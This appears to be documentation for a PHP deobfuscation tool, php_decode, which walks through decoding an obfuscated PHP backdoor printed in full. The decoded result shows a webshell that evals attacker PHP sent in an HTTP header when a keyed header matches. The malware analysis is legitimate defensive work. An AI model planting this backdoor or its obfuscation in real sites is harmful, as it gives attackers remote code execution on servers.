php_decode malware example
==========================
Here is an example for an older obfuscated php malware file, which contains
a webserver backdoor triggered by cgi-variables:
```
<?php
$_XABbaW='pu7T'|~X2Zqnho8u;$y28TUF="mo~on{".jugio&mwwoo.'{k|w}o';$jsXxi7upHSA='O~%'^/*L'.
         'Wj*/dJb;$nAHW311b6=g_BA.'~o(B4g+;'^'S|'.boF1bwz_um;$afOOxRJlAQw="DU]ig-"./*zZ'.
         '=[AaQ?r{*/oogy."=3"&DQEIo."<?E:Y=?";$zn12LWt7t='?c}q<~*?wz{?;'.zjwn7cg.#fqAc7'.
         ';k'&'~bey>/gm^j3??*2'.womc.';qj';$dt='5USY [)j"LW`hO&j[?r^q-*f6)l6'^'j(8{``@>'.
         'Os-XT|}"3'.tGv9_WQNPVQ;$KZt5KcU='z~ZV3|?/>j[H^_q<2ggT|:+_*%w_'&'>>^ug|?}5}KX^'.
         '^2}>6{I/{+'.N39wz;$z0=' &1&962D(&014"`'|'011f1 !'.b81131BA;$Sf0NknItp='07'./*'.
         'k>*/mmv529.'='.ey77z.'>'&'z~ef?z2}{w='.s7gp;$JqX='$&'|'0B';$jHk5PZchGWm=#t2XJ'.
         '$'.QUSY.'!%xh'|'!'.KRCD.'%Eh!';$b1_Achmu='d`$'^'"0V';$B0=omwwnw&'g}}gnv';'lBb'.
         'Yns+={3r;';$acCiJEXKyLy='o@"EFv'|' 5Veh@';$Ovhb=HTvp_&mtTZ_;$TGFShc2WeJ=#m6Oh'.
         '}'&C;$eR42ZCQa=$y28TUF&('nev}'.owougo.'~'&owwwowmvmo.'~');$n2jWqxKmtC=/*Zt46p'.
         'i*/$jsXxi7upHSA^$b1_Achmu;$LUHdvaNPSFD=$B0&$acCiJEXKyLy;$UA1V8Z0Dvp=/*VCpvX5n'.
         '{q3@=%X&_+*/$nAHW311b6^$afOOxRJlAQw;$cUbXcou2nC=('7hh{&$]XWI 8##'.NAu7JW.#JKG'.
         ',E'^'A^'.YZER.' =2dLC]_%u^'.Mg5Pj)^$zn12LWt7t;$IXb=$dt^$KZt5KcU;if(!/*oLfFxRM'.
         'sY84}Eb*/$eR42ZCQa($n2jWqxKmtC($LUHdvaNPSFD($Ovhb.$TGFShc2WeJ)),$z0./*xvfjkHH'.
         '1_*/$Sf0NknItp.$JqX))$UA1V8Z0Dvp($jHk5PZchGWm,$LUHdvaNPSFD($cUbXcou2nC),/*mv7'.
         'oH,,L*/$IXb);#|F]|EbESjgVf@ xO;<$Iy&^~laRxST9+x rBcW2$^:NS-6kH7pdjdDpg^!dz <'.
```
When this file is parsed and formatted with all strings substituted by statement
tokens, it looks like this:
```
# php_decode -pu <file>

<?php $_XABbaW = #str2 | (~#const1); 
$y28TUF = (#str3 . #const2) & (#const3 . #str4); 
$jsXxi7upHSA = #str5 ^ #const4; 
$nAHW311b6 = (#const5 . #str6) ^ (#str7 . #const6); 
$afOOxRJlAQw = (#str8 . #const7 . #str9) & (#const8 . #str10); 
$zn12LWt7t = (#str11 . #const9 . #str12) & (#str13 . #const10 . #str14); 
$dt = #str15 ^ (#str17 . #const11); 
$KZt5KcU = #str18 & (#str20 . #const12); 
$z0 = #str21 | (#str22 . #const13); 
$Sf0NknItp = (#str23 . #const14 . #str24 . #const15 . #str25) & (#str26 . #const16); 
$JqX = #str27 | #str28; 
$jHk5PZchGWm = (#str29 . #const17 . #str30) | (#str31 . #const18 . #str32); 
$b1_Achmu = #str33 ^ #str34; 
$B0 = #const19 & #str35; 
#str37; 
$acCiJEXKyLy = #str38 | #str39; 
$Ovhb = #const20 & #const21; 
$TGFShc2WeJ = #str40 & #const22; 
$eR42ZCQa = $y28TUF & (#str41 . #const23 . #str42) & (#const24 . #str42); 
$n2jWqxKmtC = $jsXxi7upHSA ^ $b1_Achmu; 
$LUHdvaNPSFD = $B0 & $acCiJEXKyLy; 
$UA1V8Z0Dvp = $nAHW311b6 ^ $afOOxRJlAQw; 
$cUbXcou2nC = (#str43 . #const25 . #str44) ^ (#str45 . #const26 . #str46 . #const27) ^ $zn12LWt7t; 
$IXb = $dt ^ $KZt5KcU; 
if (!$eR42ZCQa ($n2jWqxKmtC ($LUHdvaNPSFD ($Ovhb . $TGFShc2WeJ)), $z0 . $Sf0NknItp . $JqX)) { 
        $UA1V8Z0Dvp ($jHk5PZchGWm, $LUHdvaNPSFD ($cUbXcou2nC), $IXb); 
} 
#str47; 
 ?>
```
It is not possible to substute variable names as well as strings, consts and numbers,
because php might generate variable names from strings (${var} vars) in parts of the
code. With actual string values the output looks like this:
```
# php_decode -p <file>

<?php $_XABbaW = 'pu7T' | (~X2Zqnho8u); 
$y28TUF = ('mo~on{' . jugio) & (mwwoo . '{k|w}o'); 
$jsXxi7upHSA = 'O~%' ^ dJb; 
$nAHW311b6 = (g_BA . '~o(B4g+;') ^ ('S|' . boF1bwz_um); 
$afOOxRJlAQw = ('DU]ig-' . oogy . '=3') & (DQEIo . '<?E:Y=?'); 
$zn12LWt7t = ('?c}q<~*?wz{?;' . zjwn7cg . ';k') & ('~bey>/gm^j3??*2' . womc . ';qj'); 
$dt = '5USY [)j"LW`hO&j[?r^q-*f6)l6' ^ ('j(8{``@>Os-XT|}"3' . tGv9_WQNPVQ); 
$KZt5KcU = 'z~ZV3|?/>j[H^_q<2ggT|:+_*%w_' & ('>>^ug|?}5}KX^^2}>6{I/{+' . N39wz); 
$z0 = ' &1&962D(&014"`' | ('011f1 !' . b81131BA); 
$Sf0NknItp = ('07' . mmv529 . '=' . ey77z . '>') & ('z~ef?z2}{w=' . s7gp); 
$JqX = '$&' | '0B'; 
$jHk5PZchGWm = ('$' . QUSY . '!%xh') | ('!' . KRCD . '%Eh!'); 
$b1_Achmu = 'd`$' ^ '"0V'; 
$B0 = omwwnw & 'g}}gnv'; 
'lBbYns+={3r;'; 
$acCiJEXKyLy = 'o@"EFv' | ' 5Veh@'; 
$Ovhb = HTvp_ & mtTZ_; 
$TGFShc2WeJ = '}' & C; 
$eR42ZCQa = $y28TUF & ('nev}' . owougo . '~') & (owwwowmvmo . '~'); 
$n2jWqxKmtC = $jsXxi7upHSA ^ $b1_Achmu; 
$LUHdvaNPSFD = $B0 & $acCiJEXKyLy; 
$UA1V8Z0Dvp = $nAHW311b6 ^ $afOOxRJlAQw; 
$cUbXcou2nC = ('7hh{&$]XWI 8##' . NAu7JW . ',E') ^ ('A^' . YZER . ' =2dLC]_%u^' . Mg5Pj) ^ $zn12LWt7t; 
$IXb = $dt ^ $KZt5KcU; 
if (!$eR42ZCQa ($n2jWqxKmtC ($LUHdvaNPSFD ($Ovhb . $TGFShc2WeJ)), $z0 . $Sf0NknItp . $JqX)) { 
        $UA1V8Z0Dvp ($jHk5PZchGWm, $LUHdvaNPSFD ($cUbXcou2nC), $IXb); 
} 
'&U8=M4[_NbnI9qtO+_DERphA}5:=A$!kyEdi3_9s'; 
 ?>
```
When php_decode is also instructed to apply all possible transformations
based on the values defined in the script, the output looks like this:
```
# php_decode <file>

<?php $_XABbaW = '��ޑ��Ǌ'; 
$y28TUF = 'mgvon{jtgio'; 
$jsXxi7upHSA = '+4G'; 
$nAHW311b6 = '4# .8^J5N8^V'; 
$afOOxRJlAQw = 'DQEIg,/E"Y=3'; 
$zn12LWt7t = '>beq<."-Vj3?;*"wn%c#1j'; 
$dt = '_}k"@;iTm?z8<3[HhK5(Hr}7xy:g'; 
$KZt5KcU = ':>ZT#|?-4hKH^^0<2&c@,:+N"!wZ'; 
$z0 = '071f963f87135ba'; 
$Sf0NknItp = '06ed60299e937b0'; 
$JqX = '4f'; 
$jHk5PZchGWm = '%[WS]%exi'; 
$b1_Achmu = 'FPr'; 
$B0 = 'gmugnv'; 
'lBbYns+={3r;'; 
$acCiJEXKyLy = 'ouvenv'; 
$Ovhb = 'HTTP_'; 
$TGFShc2WeJ = 'A'; 
$eR42ZCQa = 'levenshtein'; 
$n2jWqxKmtC = 'md5'; 
$LUHdvaNPSFD = 'getenv'; 
$UA1V8Z0Dvp = 'preg_replace'; 
$cUbXcou2nC = 'HTTP_X_H3G_DEVICE_NAME'; 
$IXb = 'eC1vcGVyYW1pbmktZmVhdHVyZXM='; 
if (!levenshtein(md5(getenv('HTTP_A')), '071f963f87135ba06ed60299e937b04f')) { 
        preg_replace('%[WS]%exi', getenv('HTTP_X_H3G_DEVICE_NAME'), 'eC1vcGVyYW1pbmktZmVhdHVyZXM='); 
} 
'&U8=M4[_NbnI9qtO+_DERphA}5:=A$!kyEdi3_9s'; 
 ?>
```
From this output it is obvious, that this cgi-script can call arbitrary php
code passed via a 'HTTP_X_H3G_DEVICE_NAME' HTTP-Header (replacing 'W' in 
the subject string), when an additional matching key is passed via the
'HTTP_A' HTTP-header.

The 'e'-flag of the preg_replace() function calls eval() on the result of
the completed replacement.

Note: 
  Since php-7.0 calling the preg_replace()-function with the 'e'-modifier
  is an error. And also since php-8.0 the propagation of an undefined const
  'bareword' to string is an error. So this malware script would only work
  on older versions of the php interpreter like php-5.6.

